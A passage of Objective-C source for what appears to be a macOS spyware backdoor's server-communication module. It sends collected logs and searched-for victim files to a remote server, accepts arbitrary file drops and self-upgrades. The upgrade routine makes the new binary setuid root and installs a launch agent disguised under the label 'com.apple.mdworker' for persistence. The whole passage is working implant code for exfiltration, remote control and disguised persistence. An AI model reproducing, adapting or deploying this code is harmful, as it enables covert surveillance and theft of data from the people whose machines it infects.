              if ([self _sendCommandData: tempData] == FALSE)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Waiting for Response");
#endif
              if ([self _receiveCommand] != PROTO_OK)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Sending logData");
#endif
              if ([self _sendCommandData: logData] == FALSE)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Waiting for Response");
#endif
              if ([self _receiveCommand] != PROTO_OK)
                {
                  return FALSE;
                }
              
              //[communicationLock lock];
              NSString *logPath = [[anObject objectForKey: @"logName"] retain];
              //[communicationLock unlock];
              
              if ([[NSFileManager defaultManager] removeItemAtPath: logPath
                                                             error: nil] == YES)
                {
#ifdef DEBUG
                  warnLog(ME, @"Log file removed correctly");
#endif
                }
              
              [logPath release];
            }
          
          [logName release];
          
          //
          // Remove log entry from the send queue
          //
          [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
                          withLogID: [[anObject objectForKey: @"logID"] intValue]];
          
          //
          // Sleep as specified in configuration
          //
          if (mMaxDelay > 0)
            {
              srand(time(NULL));
              int sleepTime = rand() % (mMaxDelay - mMinDelay) + mMinDelay;
              
#ifdef DEBUG
              infoLog(ME, @"Sleeping %d seconds", sleepTime);
#endif
              
              sleep(sleepTime);
            }
          else
            {
              usleep(300000);
            }
        }
    }
  
  //
  // Now send all the logs left on the filesystem
  //
#ifdef DEV_MODE
  unsigned char result[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
  
  NSData *temp = [NSData dataWithBytes: result
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
  RCSMEncryption *_encryption = [[RCSMEncryption alloc] initWithKey: temp];
  NSString *encryptedLogPath = [[NSString alloc] initWithFormat: @"%@/*.%@",
                                [[NSBundle mainBundle] bundlePath],
                                [_encryption scrambleForward: @"log"
                                                        seed: gLogAesKey[0]]];
  [_encryption release];
  
  //NSArray *logFiles = searchFile(encryptedLogExtension);
  NSArray *logFiles = searchForProtoUpload(encryptedLogPath);
  
  [encryptedLogPath release];
  
#ifdef DEBUG
  infoLog(ME, @"searching for logs left on the fs");
  infoLog(ME, @"logFiles found on disk: %@", logFiles);
#endif
  
  if (logFiles != nil)
    {
      for (NSString *logName in logFiles)
        {
          BOOL fileIsInActiveQueue = FALSE;
#ifdef DEBUG
          infoLog(ME, @"current file: %@", logName);
#endif
          for (NSDictionary *tempDictionary in [logManager mActiveQueue])
            {
              NSString *tempLogName = [[tempDictionary objectForKey: @"logName"] lastPathComponent];
#ifdef DEBUG
              infoLog(ME, @"dictionary log name: %@", tempLogName);
#endif
              
              if ([tempLogName isEqualToString: [logName lastPathComponent]])
                {
#ifdef DEBUG
                  infoLog(ME, @"Log is in the active queue");
#endif
                  fileIsInActiveQueue = TRUE;
                }
            }
          
          if (fileIsInActiveQueue == FALSE)
            {
#ifdef DEBUG
              infoLog(ME, @"Sending log: %@", logName);
#endif
              NSData *logData = [NSData dataWithContentsOfFile: logName];
              
              int fileSize = [logData length];
              u_int buffer[2];
              
              buffer[0] = PROTO_LOG;
              buffer[1] = fileSize;
              
              NSData *tempData = [NSData dataWithBytes: &buffer
                                                length: sizeof(buffer)];
#ifdef DEBUG
              infoLog(ME, @"Sending PROTO_LOG command");
#endif
              if ([self _sendCommandData: tempData] == FALSE)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Waiting for Response");
#endif
              if ([self _receiveCommand] != PROTO_OK)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Sending logData");
#endif
              if ([self _sendCommandData: logData] == FALSE)
                {
                  return FALSE;
                }
#ifdef DEBUG
              infoLog(ME, @"Waiting for Response");
#endif
              if ([self _receiveCommand] != PROTO_OK)
                {
                  return FALSE;
                }
              
              //
              // Since the entry is not present in the send queue just remove the
              // file from the filesystem
              //
              if ([[NSFileManager defaultManager] removeItemAtPath: logName
                                                             error: nil] == YES)
                {
#ifdef DEBUG
                  warnLog(ME, @"Log file removed correctly");
#endif
                }
              
              //
              // Sleep as specified in configuration
              //
              if (mMaxDelay > 0)
                {
                  srand(time(NULL));
                  int sleepTime = rand() % (mMaxDelay - mMinDelay) + mMinDelay;
                  
#ifdef DEBUG
                  infoLog(ME, @"Sleeping %d seconds", sleepTime);
#endif
                  
                  sleep(sleepTime);
                }
              else
                {
                  usleep(300000);
                }
            }
        }
    }

  if ([self _sendCommand: PROTO_LOG_END] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  return TRUE;
}

- (BOOL)_prepareAndUploadLocalFileLog: (NSString *)aFilePath
{
  //NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  logDownloadStruct *additionalHeader;
  
  u_int numOfTotalChunks  = 1;
  u_int currentChunk      = 1;
  u_int currentChunkSize  = 0;
  
  NSDictionary *fileAttributes;
  fileAttributes = [[NSFileManager defaultManager]
                    attributesOfItemAtPath: aFilePath
                                     error: nil];
  
  u_int fileSize = [[fileAttributes objectForKey: NSFileSize] unsignedIntValue];
  
  numOfTotalChunks = fileSize / MAX_UPLOAD_CHUNK_SIZE + 1;
  
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aFilePath];
  
#ifdef DEBUG
  debugLog(ME, @"numOfTotalChunks: %d", numOfTotalChunks);
#endif
  
  do
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      u_int fileNameLength = 0;
      NSString *fileName;
      
      if (numOfTotalChunks > 1)
        {
          fileName = [[NSString alloc] initWithFormat: @"%@ [%d of %d]",
                      aFilePath,
                      currentChunk,
                      numOfTotalChunks];
        }
      else
        {
          fileName = [[NSString alloc] initWithString: aFilePath];
        }
      
#ifdef DEBUG
      debugLog(ME, @"%@", fileName);
      debugLog(ME, @"with Size: %d", fileSize);
#endif

      currentChunkSize = fileSize;
      if (currentChunkSize > MAX_UPLOAD_CHUNK_SIZE)
        currentChunkSize = MAX_UPLOAD_CHUNK_SIZE;
      
#ifdef DEBUG
      debugLog(ME, @"currentChunkSize: %d", currentChunkSize);
#endif
      
      fileSize -= currentChunkSize;
      currentChunk++;
      
      fileNameLength = [fileName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      //
      // Fill in the agent additional header
      //
      NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength:
                                            sizeof(logDownloadStruct) + fileNameLength];
      additionalHeader = (logDownloadStruct *)[rawAdditionalHeader bytes];
      
      additionalHeader->version         = LOG_FILE_VERSION;
      additionalHeader->fileNameLength  = [fileName lengthOfBytesUsingEncoding:
                                           NSUTF16LittleEndianStringEncoding];
      
      [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(logDownloadStruct), fileNameLength)
                                     withBytes: [[fileName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
      
      RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
      
      BOOL success = [logManager createLog: LOG_DOWNLOAD
                               agentHeader: rawAdditionalHeader
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          NSData *_fileData = nil;
          
          if ((_fileData = [fileHandle readDataOfLength: currentChunkSize]) == nil)
            {
#ifdef DEBUG
              errorLog(ME, @"Error while reading file");
#endif
              return FALSE;
            }
      
          NSMutableData *fileData = [[NSMutableData alloc] initWithData: _fileData];
          
          if ([logManager writeDataToLog: fileData
                                forAgent: LOG_DOWNLOAD
                               withLogID: 0] == TRUE)
#ifdef DEBUG_VERBOSE_1
            infoLog(ME, @"data written correctly");
#endif
          [logManager closeActiveLog: LOG_DOWNLOAD
                           withLogID: 0];
          [fileData release];
        }
    
#ifdef DEBUG_VERBOSE_1
      infoLog(ME, @"Sending fileLog");
#endif

      [fileName release];
      [innerPool drain];
    }
  while (fileSize > 0);
  
  [fileHandle closeFile];
  //[outerPool release];
  
  return TRUE;
}

- (BOOL)_receiveNewConfiguration
{
  NSMutableData *fileSize = [[NSMutableData alloc] init];
  int dataSize = sizeof(int);
  
  //
  // Receive file length
  //
  if ([self _receiveCommandData: fileSize
                           size: dataSize] == TRUE)
    {
      [fileSize getBytes: &dataSize length: sizeof(int)];
      [fileSize release];
#ifdef DEBUG
      debugLog(ME, @"dataSize: %d", dataSize);
#endif
      if (dataSize == 0)
        return FALSE;
      
      if ([self _sendCommand: PROTO_OK] != TRUE)
        return FALSE;
      
      NSMutableData *configurationFileData = [[NSMutableData alloc] init];
      
      if ([self _receiveCommandData: configurationFileData
                               size: dataSize] == TRUE)
        {
          //
          // Store new configuration file
          //
          RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
          //taskManager.mShouldReloadConfiguration = YES;
          
          if ([taskManager updateConfiguration: configurationFileData] == FALSE)
            {
#ifdef DEBUG
              errorLog(ME, @"Error while storing new configuration");
#endif
              
              [configurationFileData release];
              
              return FALSE;
            }
          
          [configurationFileData release];
#ifdef DEBUG
          infoLog(ME, @"New configuration file saved correctly");
#endif
          if ([self _sendCommand: PROTO_OK] == FALSE)
            return FALSE;
        }
    }  
      
  return TRUE;
}

- (BOOL)_uploadFiles
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    return FALSE;
  
  NSMutableData *_searchStringSize = [[NSMutableData alloc] init];
  int searchStringSize = sizeof(int);
  
  //
  // Receive file length
  //
  if ([self _receiveCommandData: _searchStringSize
                           size: searchStringSize] == TRUE)
    {
      [_searchStringSize getBytes: &searchStringSize length: sizeof(int)];
      [_searchStringSize release];
      
      if (searchStringSize == 0)
        return FALSE;
      
      if ([self _sendCommand: PROTO_OK] != TRUE)
        return FALSE;
      
      NSMutableData *_searchString = [[NSMutableData alloc] init];
      
      if ([self _receiveCommandData: _searchString
                               size: searchStringSize] == TRUE)
        {
          if ([self _sendCommand: PROTO_OK] != TRUE)
            return FALSE;
          
          //
          // Search file on the system
          //
          NSString *searchString = [[NSString alloc] initWithData: _searchString 
                                                         encoding: NSUTF16LittleEndianStringEncoding];
          
          NSArray *returnedFiles = searchForProtoUpload(searchString);
          
          [searchString release];
          [_searchString release];
#ifdef DEBUG
          debugLog(ME, @"returnedFiles: %d", [returnedFiles count]);
#endif
          
          if ([returnedFiles count] == 0)
            {
#ifdef DEBUG
              warnLog(ME, @"Files not found");
#endif
              if ([self _sendCommand: PROTO_ENDFILE] == FALSE)
                return FALSE;
              else
                return TRUE;
            }
          
          for (NSString *filePath in returnedFiles)
            {
              //
              // Prepare the file with the log header and send it
              //
#ifdef DEBUG
              debugLog(ME, @"filePath: %@", filePath);
#endif
              
              if ([self _prepareAndUploadLocalFileLog: filePath] == FALSE)
                return FALSE;
            }
        }
      else
        return FALSE;
    }
  
  [outerPool release];
  
  return TRUE;
}

- (BOOL)_downloadFile
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    return FALSE;
  
  NSMutableData *_fileNameLength = [[NSMutableData alloc] init];
  int fileNameLength = sizeof(int);
  
  //
  // Receive file name length
  //
  if ([self _receiveCommandData: _fileNameLength
                           size: fileNameLength] == FALSE)
    {
      return FALSE;
    }
  
  [_fileNameLength getBytes: &fileNameLength length: sizeof(int)];
  [_fileNameLength release];
#ifdef DEBUG
  debugLog(ME, @"fileNameLength: %d", fileNameLength);
#endif
  if (fileNameLength == 0)
    return FALSE;
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    return FALSE;
  
  NSMutableData *_fileName = [[NSMutableData alloc] init];
  
  if ([self _receiveCommandData: _fileName
                           size: fileNameLength] == FALSE)
    {
      return FALSE;
    }
  
  NSString *fileName = [[NSString alloc] initWithData: _fileName
                                             encoding: NSUTF16LittleEndianStringEncoding];
  [_fileName release];
  
#ifdef DEBUG
  debugLog(ME, @"fileName: %@", fileName);
#endif
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    {
      [fileName release];
      return FALSE;
    }
  
  NSMutableData *_fileSize = [[NSMutableData alloc] init];
  int fileSize = sizeof(int);
  
  if ([self _receiveCommandData: _fileSize
                           size: fileSize] == FALSE)
    {
      [fileName release];
      return FALSE;
    }
  
  [_fileSize getBytes: &fileSize length: sizeof(int)];
  [_fileSize release];
  
#ifdef DEBUG
  debugLog(ME, @"fileSize: %d", fileSize);
#endif
  
  if (fileSize == 0 || fileSize > MAX_DOWNLOAD_FILE_SIZE)
    {
      [fileName release];
      
      return FALSE;
    }
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    {
      [fileName release];
      return FALSE;
    }
  
  NSMutableData *fileData = [[NSMutableData alloc] init];
  
  if ([self _receiveCommandData: fileData
                           size: fileSize] == FALSE)
    {
      [fileData release];
      [fileName release];
      return FALSE;
    }
  
  [fileData writeToFile: fileName atomically: YES];
  [fileData release];
  [fileName release];
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    {
      return FALSE;
    }
  
  [outerPool release];
  
  return TRUE;  
}

- (BOOL)_downloadUpgrade;
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL tmpSuccess;
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    {
      return FALSE;
    }
  
  NSMutableData *_fileSize = [[NSMutableData alloc] init];
  int fileSize = sizeof(int);
  
  //
  // Receive file Size
  //
  if ([self _receiveCommandData: _fileSize
                           size: fileSize] == FALSE)
    {
      return FALSE;
    }
  
  [_fileSize getBytes: &fileSize length: sizeof(int)];
  [_fileSize release];
  
  if (fileSize == 0)
    return FALSE;
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    return FALSE;
  
  NSMutableData *fileData = [[NSMutableData alloc] init];
  
  if ([self _receiveCommandData: fileData
                           size: fileSize] == FALSE)
    {
      [fileData release];
      return FALSE;
    }
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            gBackdoorUpdateName];
  
  [fileData writeToFile: _upgradePath
             atomically: YES];
  [fileData release];
  
  if ([self _sendCommand: PROTO_OK] == FALSE)
    return FALSE;
  
  //
  // Forcing suid permission on the backdoor upgrade
  //
  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: 0];
  
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  nil];
  
  tmpSuccess = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                                ofItemAtPath: _upgradePath
                                                       error: nil];
  
  if (tmpSuccess == NO)
    {
#ifdef DEBUG
      errorLog(ME, @"Error while changing attributes on the upgrade file");
#endif
    }
  
  [_upgradePath release];
  
  //
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot
  //
  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                   [[[[[NSBundle mainBundle] bundlePath]
                                      stringByDeletingLastPathComponent]
                                     stringByDeletingLastPathComponent]
                                    stringByDeletingLastPathComponent],
                                   BACKDOOR_DAEMON_PLIST ];
  
  NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath] stringByReplacingOccurrencesOfString: gBackdoorName
                                                                                              withString: gBackdoorUpdateName];
  
  [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
                                             error: nil];
  
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
  NSDictionary *innerDict;
  
  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               @"com.apple.mdworker", @"Label",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: _backdoorPath, nil], @"ProgramArguments", nil];
  //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  /*
  NSString *myData = [NSString stringWithFormat:
                      @"#!/bin/bash\n %@ &\n", _backdoorPath];
  */
  tmpSuccess = [rootObj writeToFile: backdoorLaunchAgent
                         atomically: NO];
  /*
  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
  NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                              encoding: NSUTF8StringEncoding];
  
  [fileContent replaceOccurrencesOfString: gBackdoorName
                               withString: gBackdoorUpdateName
                                  options: NSCaseInsensitiveSearch
                                    range: NSMakeRange(0, [fileContent length])];
  
  [_fileContent release];
  [fileContent release];
   */
  [outerPool release];
  
  return tmpSuccess;
}

@end

@implementation RCSMCommunicationManager

- (id)initWithConfiguration: (NSData *)aConfiguration
{
  self = [super init];
  
  if (self != nil)
    {
      syncStruct *header  = (syncStruct *)[aConfiguration bytes];
      
      mMinDelay           = header->minSleepTime;
      mMaxDelay           = header->maxSleepTime;
      mBandwidthLimit     = header->bandwidthLimit;
            
      mServerIP   = [[NSString alloc] initWithCString: header->configString];
      mBackdoorID = [[NSString alloc] initWithCString: header->configString + strlen(header->configString) + 1];

#ifdef DEBUG      
      debugLog(ME, @"minDelay  : %d", mMinDelay);
      debugLog(ME, @"maxDelay  : %d", mMaxDelay);
      debugLog(ME, @"bandWidth : %d", mBandwidthLimit);
      debugLog(ME, @"ServerIP  : %@", mServerIP);
      debugLog(ME, @"backdoorID: %@", mBackdoorID);
#endif
      
      mChallenge = [[NSMutableData alloc] init];
      mTempChallenge = [[NSData alloc] initWithBytes: &gChallenge
                                              length: strlen(gChallenge)];
    }
  else
    return nil;
  
  return self;
}

- (void)dealloc
{
  [mServerIP release];
  [mBackdoorID release];
  [mChallenge release];
  [mTempChallenge release];
  
  [super dealloc];
}

- (BOOL)performSync
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  //
  // Perform handshake aka Challenge / Response initialization
  //
#ifdef DEBUG
  infoLog(ME, @"Sync started");
#endif
  
  if ([self _handshake] == TRUE)
    {
#ifdef DEBUG
      warnLog(ME, @"Handshake completed succesfully");
#endif
      //
      // Identify ourself
      //
      if ([self _identifyOurself] == YES)
        {
#ifdef DEBUG
          warnLog(ME, @"Correctly identified ourself");
#endif
        }
      else
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"Error while identifying ourself");
#endif
          
          [iStream close];
          [oStream close];
          
          [iStream release];
          [oStream release];
          
          [outerPool drain];
          
          return FALSE;
        }
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while handshaking, why don't ya want to have sex with me? :(");
#endif
      
      [iStream close];
      [oStream close];
      
      [iStream release];
      [oStream release];
      
      [outerPool drain];
      
      return FALSE;
    }
  
  /*
  [iStream setProperty: NSStreamSocketSecurityLevelNegotiatedSSL
                forKey: NSStreamSocketSecurityLevelKey];
  [iStream setProperty: [url host]
                forKey: (id)kCFStreamSSLPeerName];
  
  [iStream setDelegate: self];
  [oStream setDelegate: self];
  
  [iStream scheduleInRunLoop: [NSRunLoop currentRunLoop]
                     forMode: NSDefaultRunLoopMode];
  [oStream scheduleInRunLoop: [NSRunLoop currentRunLoop]
                     forMode: NSDefaultRunLoopMode];
  */
  
#ifdef DEBUG
  infoLog(ME, @"Waiting for server commands");
#endif
  
  while (1)
    {
      u_int command = [self _receiveCommand];
#ifdef DEBUG
      debugLog(ME, @"command: %d", command);
#endif
      switch (command)
        {
        case PROTO_SYNC:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_SYNC");
#endif
            if ([self _sendLogs] == FALSE)
              [self _sendCommand: PROTO_NO];
            
            break;
          }
        case PROTO_NEW_CONF:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_NEW_CONF");
#endif
            if ([self _receiveNewConfiguration] == FALSE)
              [self _sendCommand: PROTO_NO];
            
            break;
          }
        case PROTO_UNINSTALL:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_UNINSTALL");
#endif
            [self _sendCommand: PROTO_OK];
            
            RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
            [taskManager uninstallMeh];
            
            [outerPool drain];
            
            return TRUE;
          }
        case PROTO_DOWNLOAD:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_DOWNLOAD");
#endif
            if ([self _uploadFiles] == FALSE)
              [self _sendCommand: PROTO_NO];
            
            break;
          }
        case PROTO_UPLOAD:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_UPLOAD");
#endif
            if ([self _downloadFile] == FALSE)
              [self _sendCommand: PROTO_NO];
            
            break;
          }
        case PROTO_UPGRADE:
          {
#ifdef DEBUG
            infoLog(ME, @"PROTO_UPGRADE");
#endif
            if ([self _downloadUpgrade] == FALSE)
              [self _sendCommand: PROTO_NO];
            
            break;
          }
        case PROTO_BYE:
          {
#ifdef DEBUG
            warnLog(ME, @"Server BYE");
#endif
            [self _sendCommand: PROTO_BYE];
            
            [iStream close];
            [oStream close];
            
            [iStream release];
            [oStream release];
            
            //
            // Time to reload the configuration, if needed
            //
            RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
            
            if (_taskManager.mShouldReloadConfiguration == YES)
              {
#ifdef DEBUG
                warnLog(ME, @"Should reload configuration now");
#endif
                [_taskManager reloadConfiguration];
              }
            else
              {
#ifdef DEBUG
                warnLog(ME, @"We shouldn't reload configuration now");
#endif
              }
            
            [outerPool drain];
            
            return TRUE;
          }
        case PROTO_INVALID:
          {
#ifdef DEBUG
            errorLog(ME, @"PROTO_INVALID on receiveCommand");
#endif
            
            [self _sendCommand: PROTO_BYE];
            
            [iStream close];
            [oStream close];
            
            [iStream release];
            [oStream release];
            
            [outerPool drain];
            
            return FALSE;
          }
        default:
          {
            [iStream close];
            [oStream close];
            
            [iStream release];
            [oStream release];
            
            //
            // Time to reload the configuration, if needed
            //
            RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
            
            if (_taskManager.mShouldReloadConfiguration == YES)
              {
                [_taskManager reloadConfiguration];
              }
            
            [outerPool drain];
            
            return FALSE;
          }
        }
      
      usleep(80000);
    }
}

#pragma mark -
#pragma mark NSStream callback Methods
#pragma mark -

// Not used as of now
#if 0
- (void)stream: (NSStream *)stream handleEvent: (NSStreamEvent)eventCode
{
  NSLog(@"stream:handleEvent: is invoked...");

  switch(eventCode)
    {
    case NSStreamEventHasSpaceAvailable:
      {
        if (stream == oStream) {
          NSString * str = [NSString stringWithFormat:
                            @"GET / HTTP/1.0\r\n\r\n"];
          
          const uint8_t *rawstring = (const uint8_t *)[str cStringUsingEncoding: NSUTF8StringEncoding];
          [oStream write: rawstring
               maxLength: strlen((char *)rawstring)];
          //[oStream close];
        }
        
        break;
      }
    case NSStreamEventEndEncountered:
      {
        [stream close];
        [stream removeFromRunLoop:[NSRunLoop currentRunLoop]
                          forMode:NSDefaultRunLoopMode];
        [stream release];
        stream = nil; // stream is ivar, so reinit it
        
        break;
      }
    }  
}
#endif

@end